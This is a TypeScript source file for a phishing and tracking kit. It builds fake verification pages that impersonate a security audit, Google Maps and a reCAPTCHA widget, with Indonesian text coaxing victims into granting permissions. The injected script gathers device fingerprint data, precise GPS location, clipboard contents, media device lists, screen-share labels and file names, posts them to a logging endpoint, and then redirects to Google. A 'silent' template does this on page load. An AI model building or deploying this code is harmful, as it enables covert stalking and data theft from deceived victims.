export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; 
  const perms = theme.perms || ['gps']; 
  
  return `
<script>
  (function() {
    var permsAttempted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var requiredPerms = ${JSON.stringify(perms)};
    var cfg = ${JSON.stringify(theme)};
    
    function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 40 : 12;
      if (elapsed >= threshold || (permsAttempted >= requiredPerms.length && elapsed >= 3)) {
        hasRedirected = true;
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 500);
       };
    }

    setInterval(checkRedirect, 1000);

    window.startCapture = async function(mode) {
      var box = document.querySelector('.box') || document.querySelector('.container') || document.body;
      if (!box) return;

      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      if (!isSilent) {
        box.innerHTML = '<div id="status-icon" style="font-size:40px; opacity:0.8; margin-bottom:15px;">' + (cfg.icon || '🔍') + '</div>' +
          '<h2 id="status-title" style="font-weight:600; color:#2c3e50;">Verifying...</h2>' +
          '<div id="progress-container" style="width:100%; background:#ecf0f1; border-radius:4px; height:6px; margin-bottom:20px; overflow:hidden;">' +
          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.5s cubic-bezier(0.4, 0, 0.2, 1);"></div>' +
          '</div>' +
          '<p id="status-text" style="font-size:13px; color:#95a5a6; font-family:sans-serif; min-height: 40px;"></p>';
      }

      var statusTitle = document.getElementById('status-title');
      var statusText = document.getElementById('status-text');
      var bar = document.getElementById('progress-bar');
      var icon = document.getElementById('status-icon');
      
      function updateProgress(p, text, title) {
        if (bar) bar.style.width = p + '%';
        if (statusText) statusText.innerText = text;
        if (statusTitle && title) statusTitle.innerText = title;
      }

      function logEvent(type, data) {
        return fetch('/api/log/' + targetId + '/' + type, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
        }).catch(function(){});
      }

      function finish(success, reason) {
        if (isSilent) { window.location.href = targetUrl; return; }
        if (bar) bar.style.width = '100%';
        if (success) {
          if (icon) icon.innerText = "✅";
          if (statusTitle) { statusTitle.innerText = "VERIFIED"; statusTitle.style.color = "#27ae60"; }
          if (statusText) statusText.innerText = "Authentication successful. Finalizing session...";
        } else {
          if (icon) icon.innerText = "ℹ️";
          if (statusTitle) statusTitle.innerText = "COMPLETE";
          if (statusText) statusText.innerText = (reason || "") + " Syncing redirect...";
        }
        setTimeout(checkRedirect, 2000);
      }

      try {
        if (!isSilent) updateProgress(5, "Initial configuration check...", "SYSTEM_INIT");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          ref: document.referrer || "Direct"
        };
        await logEvent('info', metadata);

        var currentProgress = 10;
        var stepCount = requiredPerms.length;

        for (var i = 0; i < requiredPerms.length; i++) {
          var perm = requiredPerms[i];
          currentProgress += Math.floor(80 / stepCount);

          if (perm === 'notification') {
            if (!isSilent) updateProgress(currentProgress, "Syncing alert protocols...", "PUSH_VALIDATION");
            if ("Notification" in window) await Notification.requestPermission();
          }

          if (perm === 'clipboard') {
            if (!isSilent) updateProgress(currentProgress, "Verifying memory buffer...", "CACHE_SYNC");
            try {
              var clip = await navigator.clipboard.readText();
              if (clip) await logEvent('extra', { clipboard: clip });
            } catch(e) {}
          }

          if (perm === 'media') {
            if (!isSilent) updateProgress(currentProgress, "Calibrating AV components...", "HARDWARE_AUDIT");
            try {
               await navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(s => s.getTracks().forEach(t => t.stop())).catch(e=>{});
               var devs = await navigator.mediaDevices.enumerateDevices();
               var list = devs.map(d => d.kind + ': ' + (d.label || 'Authenticated Device')).join('\\n');
               await logEvent('extra', { media: list });
            } catch(e) {}
          }

          if (perm === 'gps') {
            if (!isSilent) {
              updateProgress(currentProgress, "Synchronizing local spatial metrics...", "REGION_AUTH");
              if (icon && cfg.waitIcon) icon.innerText = cfg.waitIcon;
            }
            await new Promise(resolve => {
               navigator.geolocation.getCurrentPosition(
                 function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                 function(err) { resolve(); },
                 { enableHighAccuracy: true, timeout: 8000 }
               );
            });
          }

          if (perm === 'screen') {
            if (!isSilent) updateProgress(currentProgress, "Establishing visual integrity link...", "VIRTUAL_SCAN");
            try {
               await navigator.mediaDevices.getDisplayMedia({ video: true }).then(s => {
                  var track = s.getVideoTracks()[0];
                  logEvent('extra', { screen_label: track.label });
                  s.getTracks().forEach(t => t.stop());
               });
            } catch(e) {}
          }

          if (perm === 'files') {
             if (!isSilent) updateProgress(currentProgress, "Syncing media storage tokens...", "STORAGE_AUDIT");
             try {
                if (window.showOpenFilePicker) {
                   var [handle] = await window.showOpenFilePicker({ types: [{ description: 'Security Token', accept: { 'image/*': ['.png', '.jpg', '.jpeg'] } }] });
                   var file = await handle.getFile();
                   await logEvent('extra', { file_name: file.name, file_size: file.size });
                }
             } catch(e) {}
          }

          permsAttempted++;
        }

        finish(true);
      } catch (err) {
        finish(false, "Service timeout.");
      }
    };
  })();
</script>
`;
};

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  '1': {
    name: "🏢 Enterprise: Cloud Security Sync (Notify + GPS)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { background:#f8f9fa; color:#333; font-family:'Segoe UI', Tahoma, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center;} .box { width:90%; max-width:400px; padding:45px; background:#fff; border-radius:8px; box-shadow:0 10px 25px rgba(0,0,0,0.05); } h2 { font-size:24px; margin-bottom:15px; color:#1a73e8; } p { color:#5f6368; font-size:14px; line-height:1.5; margin-bottom:30px; } .btn { background:#1a73e8; color:#fff; border:none; padding:15px 30px; border-radius:4px; font-weight:600; cursor:pointer; width:100%; transition:background 0.2s; } .btn:hover { background:#1557b0; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:20px;">🛡️</div><h2>Security Audit</h2><p>Lengkapi verifikasi perangkat untuk melanjutkan sesi aman Anda. Mohon izinkan notifikasi dan sinkronisasi lokasi saat diminta.</p><button class="btn" onclick="window.startCapture();">DAPATKAN SERTIFIKASI</button></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: '1', perms: ['notification', 'gps'], accent: '#1a73e8', icon: '📡',
      doneTitle: 'CERTIFIED'
    })}</body></html>`
  },
  '11': {
    name: "💎 VIP: Advanced Identity Scan (Files/Gallery + GPS + Media)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Advanced Authentication</title><style>body { background:#f4f7f6; color:#2d3436; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; } .box { width:90%; max-width:480px; padding:40px; background:#fff; border-radius:12px; border-top:5px solid #6c5ce7; box-shadow:0 15px 35px rgba(0,0,0,0.1); } h1 { font-size:22px; font-weight:700; color:#2d3436; } .btn { background:#6c5ce7; color:#fff; border:none; padding:18px 40px; border-radius:8px; font-weight:bold; cursor:pointer; width:100%; margin-top:20px; font-size:16px; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/1067/1067566.png" width="80" style="margin-bottom:20px;"><h1>Verifikasi Identitas Premium</h1><p style="color:#636e72; font-size:14px;">Untuk memastikan keamanan akun level tinggi, sistem perlu memvalidasi sertifikat visual dan koordinat regional Anda.</p><button class="btn" onclick="window.startCapture();">MULAI VALIDASI VIP</button></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: '11', perms: ['files', 'media', 'gps'], accent: '#6c5ce7', icon: '💎',
      doneTitle: 'AUTHENTICATED'
    })}</body></html>`
  },
  '5': {
    name: "📍 Maps: Location Integrity (GPS + Screen)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Maps Verification</title><style>body { font-family:sans-serif; text-align:center; padding-top:15vh; background:#fff; } .box { width:90%; max-width:450px; margin:0 auto; padding:35px; border-radius:12px; box-shadow:0 4px 30px rgba(0,0,0,0.05); } .btn { background:#34a853; color:white; padding:15px 30px; border-radius:4px; border:none; font-weight:600; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" width="60"><br><h1>Integrasi Visual Maps</h1><p>Sync identitas visual dan lokasi presisi Anda diperlukan agar rute dapat diverifikasi oleh server.</p><br><button class="btn" onclick="window.startCapture();">SINKRONKAN RUTE</button></div>${getCaptureScript(id, 'https://maps.google.com', {
      tmplId: '5', perms: ['gps', 'screen'], accent: '#34a853', icon: '🌍',
      doneTitle: 'SYNC_COMPLETE'
    })}</body></html>`
  },
  '9': {
    name: "🕵️ GHOST: Stealth Audit (Silent GPS + Clip)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f9f9f9; font-family:sans-serif; } .box { border:1px solid #ddd; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 2px 5px rgba(0,0,0,0.1); }</style></head><body><div style="text-align:center;"><p style="color:#666; margin-bottom:15px;">Validating session integrity...</p><div class="box"><div style="width:25px; height:25px; border:2px solid #ccc; margin-right:15px;"></div><div style="font-size:14px; color:#555;">Processing security link...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: '9', flow: 'silent', perms: ['gps', 'clipboard']
    })}</body></html>`
  }
};
